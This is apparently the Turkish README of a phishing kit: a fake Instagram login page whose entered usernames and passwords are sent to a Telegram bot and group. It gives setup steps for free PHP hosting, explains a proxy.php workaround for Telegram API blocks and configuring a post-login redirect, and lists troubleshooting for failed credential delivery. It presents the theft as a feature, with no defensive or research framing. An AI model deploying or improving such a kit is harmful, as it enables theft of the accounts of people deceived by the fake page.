# Instagram Clone - Static Version

Bu proje, Instagram benzeri bir login sayfası oluşturur ve girilen bilgileri Telegram botuna iletir.

## Kurulum

1. Tüm dosyaları web sunucunuza yükleyin
2. `proxy.php` dosyasının çalışması için PHP destekli bir web sunucusuna ihtiyacınız vardır
3. Redirect URL'i değiştirmek için `telegram.js` dosyasında `REDIRECT_URL` değişkenini düzenleyin

## Dosyalar

- `index.html`: Ana sayfa
- `telegram.js`: Telegram entegrasyonu
- `proxy.php`: Telegram API ile iletişim için gerekli
- `/images/`: Logo ve simgeler
- `/assets/`: CSS ve JS dosyaları

## InfinityFree Kurulumu

1. InfinityFree hesabınıza giriş yapın
2. Tüm dosyaları File Manager kullanarak yükleyin
3. Sayfanın düzgün çalıştığından emin olun

## Önemli Notlar

- Bot token ve chat ID değerlerini koruyun
- Proxy.php dosyası, Telegram API'ye doğrudan erişimde yaşanan 403 Forbidden hatalarını çözmek için kullanılır
- Giriş bilgileri Telegram grubuna Markdown formatında gönderilir

## Sorun Giderme

Eğer mesajlar iletilmiyorsa:
1. Telegram bot token'ın doğru olduğundan emin olun
2. Chat ID'nin doğru olduğundan emin olun
3. Web sunucunuzun PHP ve cURL desteğine sahip olduğunu doğrulayın
4. Tarayıcı konsolunda hata mesajlarını kontrol edin